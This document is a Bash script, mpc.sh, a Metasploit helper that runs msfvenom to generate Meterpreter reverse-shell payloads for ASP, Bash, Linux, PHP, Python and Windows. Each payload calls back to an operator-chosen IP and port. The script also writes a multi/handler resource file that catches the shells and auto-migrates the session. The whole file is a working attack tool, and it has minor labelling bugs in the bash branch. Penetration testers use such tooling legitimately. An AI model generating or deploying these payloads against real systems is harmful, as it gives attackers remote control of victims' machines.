#!/bin/bash
#-Metadata----------------------------------------------------#
#  Filename: mpc.sh                      (Update: 2015-06-22) #
#-Info--------------------------------------------------------#
#  Quickly generate Metasploit payloads using msfvenom.       #
#-Author(s)---------------------------------------------------#
#  g0tmilk ~ https://blog.g0tmi1k.com/                        #
#-Operating System--------------------------------------------#
#  Designed for: Kali Linux & Metasploit v4.11+               #
#-Licence-----------------------------------------------------#
#  MIT License ~ http://opensource.org/licenses/MIT           #
#-Notes-------------------------------------------------------#
#                             ---                             #
#-------------------------------------------------------------#


#-Defaults-------------------------------------------------------------#


outputPath="$(pwd)/"     # ./  /var/www/   /tmp/

##### (Cosmetic) Colour output
RED="\033[01;31m"
GREEN="\033[01;32m"
YELLOW="\033[01;33m"
BLUE="\033[01;34m"
RESET="\033[00m"

##### Read command line arguments
TYPE="$(echo ${1} | tr '[:upper:]' '[:lower:]')"
IP="${2}"
PORT="${3}"
[[ -z "${IP}" ]] && IP=( $(ifconfig | grep inet | \grep -E '([[:digit:]]{1,2}.){4}' | sed 's/://g; s/inet//g; s/addr//g; s/^[ \t]*//' | cut -d ' ' -f1) )
[[ -z "${PORT}" ]] && PORT="443"
SUCCESS=false

##### (Optional) Enable debug mode?
#set -x


#-Function-------------------------------------------------------------#

## doAction TYPE IP PORT PAYLOAD CMD FILEEXT
function doAction {
  TYPE="${1}"
  IP="${2}"
  PORT="${3}"
  PAYLOAD="${4}"
  CMD="${5}"
  FILEEXT="${6}"

  FILENAME="$(echo ${TYPE}_meterpreter.${FILEEXT} | tr '[:upper:]' '[:lower:]')"
  FILEHANDLE="$(echo ${TYPE}_meterpreter.rc | tr '[:upper:]' '[:lower:]')"

  echo -e " ${YELLOW}[i]${RESET}   IP: ${YELLOW}${IP}${RESET}"
  echo -e " ${YELLOW}[i]${RESET} PORT: ${YELLOW}${PORT}${RESET}"
  echo -e " ${YELLOW}[i]${RESET} TYPE: ${YELLOW}${TYPE}${RESET} (${PAYLOAD})"
  echo -e " ${YELLOW}[i]${RESET}  CMD: ${YELLOW}${CMD}${RESET}"

  [[ -e "${FILENAME}" ]] && echo -e " ${YELLOW}[i]${RESET} File (${FILENAME}) ${YELLOW}already exists${RESET}. Overwriting..."
  eval "${CMD}"

  #echo -e " ${YELLOW}[i]${RESET}  File: $(file -b ${FILENAME})"
  #echo -e " ${YELLOW}[i]${RESET}  Size: $(du -h ${FILENAME} | cut -f1)"
  #echo -e " ${YELLOW}[i]${RESET}   MD5: $(md5sum ${FILENAME} | awk '{print $1}')"
  #echo -e " ${YELLOW}[i]${RESET}  SHA1: $(sha1sum ${FILENAME} | awk '{print $1}')"

  cat <<EOF > "${FILEHANDLE}"
#
# RUN:   service postgresql start; service metasploit start; msfconsole -q -r "${FILENAME}"
#
setg TimestampOutput true
setg VERBOSE true
use exploit/multi/handler
set PAYLOAD ${PAYLOAD}
set LHOST ${IP}
set LPORT ${PORT}
set AutoRunScript "migrate -f"
set ExitOnSession false
exploit -j -z
EOF
  echo -e " ${YELLOW}[i]${RESET} ${TYPE} meterpreter created as '${YELLOW}${outputPath}${FILENAME}${RESET}'"
  echo -e " ${YELLOW}[i]${RESET} MSF handler file create as '${YELLOW}${FILEHANDLE}${RESET} (msfconsole -q -r $(pwd)/${FILEHANDLE})'"
  SUCCESS=true
  return
}


#-Start----------------------------------------------------------------#


## Banner
echo -e " ${BLUE}[*]${RESET} ${BLUE}M${RESET}sfvenom ${BLUE}P${RESET}ayload ${BLUE}C${RESET}reator (${BLUE}MPC${RESET})"


## IP selection menu
if [[ -n "${1}" ]] && [[ -z "${2}" ]]; then
  echo -e "\n ${YELLOW}[i]${RESET} Use which ${YELLOW}IP address${RESET}?:"
  _I=0
  for ip in "${IP[@]}"; do
    _I=$[${_I} +1]
    echo -e " ${YELLOW}[i]${RESET}   ${GREEN}${_I}${RESET}.) ${ip}"
  done
  while true; do
    echo -ne " ${YELLOW}[?]${RESET} ${GREEN}Select${RESET} 1-${#IP[@]}"; read -p ": " INPUT
    [[ "${INPUT}" -ge 1 ]] && [[ "${INPUT}" -le "${#IP[@]}" ]] && IP=${IP[${INPUT}-1]} && break
  done
  echo ""
fi

## ASP
if [[ "${TYPE}" == "asp" ]]; then
  TYPE="windows"
  FILEEXT="asp"
  PAYLOAD="${TYPE}/meterpreter/reverse_tcp"
  CMD="msfvenom --payload ${PAYLOAD} --format asp --platform ${TYPE} --arch x86 LHOST=${IP} LPORT=${PORT} -o ${outputPath}${TYPE}_meterpreter.${FILEEXT}"
  doAction "ASP" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}"
## Bash
elif [[ "${TYPE}" == "bash" ]] || [[ "${TYPE}" == "sh" ]]; then
  TYPE="bash"
  FILEEXT=".sh"
  PAYLOAD="cmd/unix/reverse_bash"
  CMD="msfvenom --payload ${PAYLOAD} --format raw --platform ${TYPE} --arch ${TYPE} LHOST=${IP} LPORT=${PORT} -o ${outputPath}${TYPE}_meterpreter.${FILEEXT}"
  doAction "PHP" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}"
## Linux
elif [[ "${TYPE}" == "linux" ]] || [[ "${TYPE}" == "lin" ]] || [[ "${TYPE}" == "elf" ]]; then
  TYPE="linux"
  FILEEXT="bin"
  PAYLOAD="${TYPE}/x86/meterpreter/reverse_tcp"
  CMD="msfvenom --payload ${PAYLOAD} --format elf --platform ${TYPE} --arch x86 LHOST=${IP} LPORT=${PORT} -o ${outputPath}${TYPE}_meterpreter.${FILEEXT}"
  doAction "Linux" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}"
## PHP
elif [[ "${TYPE}" == "php" ]]; then
  TYPE="php"
  FILEEXT="php"
  PAYLOAD="${TYPE}/meterpreter_reverse_tcp"
  CMD="msfvenom --payload ${PAYLOAD} --format raw --platform ${TYPE} --arch ${TYPE} LHOST=${IP} LPORT=${PORT} -o ${outputPath}${TYPE}_meterpreter.${FILEEXT}"
  doAction "PHP" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}"
## Python
elif [[ "${TYPE}" == "python" ]] || [[ "${TYPE}" == "py" ]]; then
  TYPE="python"
  FILEEXT="py"
  PAYLOAD="${TYPE}/meterpreter/reverse_tcp"
  CMD="msfvenom --payload ${PAYLOAD} --format raw --platform ${TYPE} --arch ${TYPE} LHOST=${IP} LPORT=${PORT} -o ${outputPath}${TYPE}_meterpreter.${FILEEXT}"
  doAction "Python" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}"
## Windows
elif [[ "${TYPE}" == "windows" ]] || [[ "${TYPE}" == "win" ]] || [[ "${TYPE}" == "exe" ]]; then
  TYPE="windows"
  FILEEXT="exe"
  PAYLOAD="${TYPE}/meterpreter/reverse_tcp"
  CMD="msfvenom --payload ${PAYLOAD} --format exe --platform ${TYPE} --arch x86 LHOST=${IP} LPORT=${PORT} -o ${outputPath}${TYPE}_meterpreter.${FILEEXT}"
  doAction "Windows" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}"
elif [[ -z "${TYPE}" ]]; then
  echo -e "\n ${YELLOW}[i]${RESET} ${YELLOW}Missing type${RESET}"
else
  echo -e "\n ${YELLOW}[i]${RESET} Unknown type: ${YELLOW}${TYPE}${RESET}"
fi

if [[ "$SUCCESS" = true ]]; then
  echo -e " ${GREEN}[?]${RESET} Quick ${GREEN}web server${RESET}?   python -m SimpleHTTPServer 8080"
  echo -e " ${BLUE}[*]${RESET} ${BLUE}Done${RESET}!"
  exit 0
else
  echo -e "\n ${YELLOW}[i]${RESET} ${BLUE}${0}${RESET} <TYPE> (<IP>) (<PORT>)"
  echo -e " ${YELLOW}[i]${RESET} TYPE:"
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}ASP${RESET} (meterpreter)"
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}Bash${RESET} (meterpreter)"
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}Linux${RESET} (meterpreter)"
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}PHP${RESET} (meterpreter)"
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}Python${RESET} (meterpreter)"
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}Windows${RESET} (meterpreter)"
  echo -e " ${YELLOW}[i]${RESET} IP will default to ${YELLOW}IP selection menu${RESET}"
  echo -e " ${YELLOW}[i]${RESET} PORT will default to ${YELLOW}443${RESET}"
  exit 1
fi
